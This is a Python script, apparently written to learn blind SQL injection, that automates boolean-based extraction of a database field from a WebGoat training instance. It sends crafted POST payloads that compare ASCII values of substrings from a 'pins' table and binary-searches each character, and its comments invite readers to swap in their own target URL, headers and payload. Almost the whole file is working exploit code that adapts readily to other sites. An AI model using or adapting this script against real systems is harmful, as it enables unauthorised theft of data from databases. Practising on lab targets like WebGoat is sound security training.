# I created this code to learn more about blind SQL injections. Once you have a working statment they are such a pain
# to iterate through, trying to guess letters or numbers. Burpsuite intruder is pretty good at this but painfully slow 
# with the free version so i made this.

# To use, replace the url and headers with your own, as well as the payload and the text to search for if it finds a 
# correct character or number.

# Since this is not completely blind as it requires a string in the response to determine if it has a correct letter or
# number, i will create a time based one.

import requests
import re
import time

start_time = time.time()
session = requests.Session()
url = "http://192.168.216.128/WebGoat/attack?Screen=89&menu=1100" #input("Enter the url: ")
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
numList = list(range(0,254)) #Generates a list from 0 to 254 which will symbolize ASCII character codes to extract information from database
name = []

headers = {'Host': '192.168.216.128',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '137',
        'Origin': 'http://192.168.216.128',
        'Authorization': 'Basic Z3Vlc3Q6Z3Vlc3Q=',
        'Connection': 'close',
        'Referer': 'http://192.168.216.128/WebGoat/attack?Screen=13&menu=1100',
        'Cookie': 'JSESSIONID=D40415742327CBCBB1BDE7BF284921FB',
        'Upgrade-Insecure-Requests': '1'}

def localvar(): #Assings a local variable - Defines which position in the name we are trying to extract i.e. first letter, second letter etc.
    pos1 = 0
    return pos1

def chngLetter(pos1): # This function will change the position of our payload to point to the next character in the dataset
    pos1 = pos1 + 1
    sendPayload(pos1) # Takes the new position and passes it to sendPayload
    

def sendPayload(pos2):
    low = 0 # Low position in array
    high = len(numList) - 1 # high position in array

    
    while low <=high:
        middle = (high + low) // 2 #Go to middle of array


        # Checking if the middle of the array matches the first character
        payload = "account_number=101+AND+%28SELECT+Ascii%28substring%28name%2C"+str(pos2)+"%2C1%29%29+FROM+pins+where+cc_number%3D4321432143214321%29%3D"+str(numList[middle])+"&SUBMIT=Go%21"
        r = session.post(url, headers=headers, data=payload, proxies=proxies)
        
        if r.ok:
            if re.search("Account number is valid", r.text): # Checks to see if statement is valid - change to your own identifier
                name.append(chr(numList[middle]))
                print("[+] Successfully found character")
                print("[+] Character is ".join(name))
                chngLetter(pos2)
                break
            else:
                #print("[-] Unsuccessfull, trying again... \n")
                var1 = 0
            
        else:
            print("[-]Error Sending Payload!")
            print(r.text)



        if (var1==0):
            # If not middle, checks to see if value is less than middle
            payload = "account_number=101+AND+%28SELECT+Ascii%28substring%28name%2C"+str(pos2)+"%2C1%29%29+FROM+pins+where+cc_number%3D4321432143214321%29%3c"+str(numList[middle])+"&SUBMIT=Go%21"
            r = session.post(url, headers=headers, data=payload, proxies=proxies)

            if r.ok:
                if re.search("Account number is valid", r.text):
                    high = middle - 1 # Looks in bottom half of array
                    var2 = 1
                    
                else:
                    var2 = 0
                    
            else:
                print("Error Sending Payload!")
                print(r.text)
        


        if(var2==0): 
            # If not any of above, checks if value is more than middle
            payload = "account_number=101+AND+%28SELECT+Ascii%28substring%28name%2C"+str(pos2)+"%2C1%29%29+FROM+pins+where+cc_number%3D4321432143214321%29%3e"+str(numList[middle])+"&SUBMIT=Go%21"
            r = session.post(url, headers=headers, data=payload, proxies=proxies)

            if r.ok:
                if re.search("Account number is valid", r.text):
                    low = middle + 1 # Looks in bottom half of array
                    
                else:
                    print("Cant find next Letter. ")
                    break

            else:
                print("[-]Error Sending Payload!")
                print(r.text)





def main():
    pos1 = localvar()               # Assigns the value returned from localvar function to the variable pos1
    pos2 = chngLetter(pos1)         # Assigns the value returned from chngLetter function to the variable pos2, passing it pos1 from earlier
    print("%s seconds" % (time.time() - start_time)) # Performance check

if __name__=="__main__":
    main()
